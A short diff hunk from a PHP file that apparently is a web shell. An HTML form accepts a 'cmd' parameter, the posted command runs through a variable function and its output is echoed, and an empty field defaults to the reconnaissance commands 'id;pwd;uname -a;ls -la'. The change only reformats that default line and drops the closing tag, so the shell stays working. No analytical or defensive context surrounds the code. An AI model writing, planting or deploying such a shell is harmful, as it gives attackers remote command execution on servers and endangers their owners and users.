@@ -16,8 +16,7 @@ echo "<form method=post>";
 echo "<input type=text name=cmd size=85>";
 echo "</form>";
 echo "<pre>";
-if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="id;pwd;uname -a;ls -la"; }
+if ((!$_POST['cmd']) || ($_POST['cmd']=="")) {
+    $_POST['cmd']="id;pwd;uname -a;ls -la";
+}
 echo "".$function($_POST['cmd'])."</pre></body></html>";
-
-
-?>
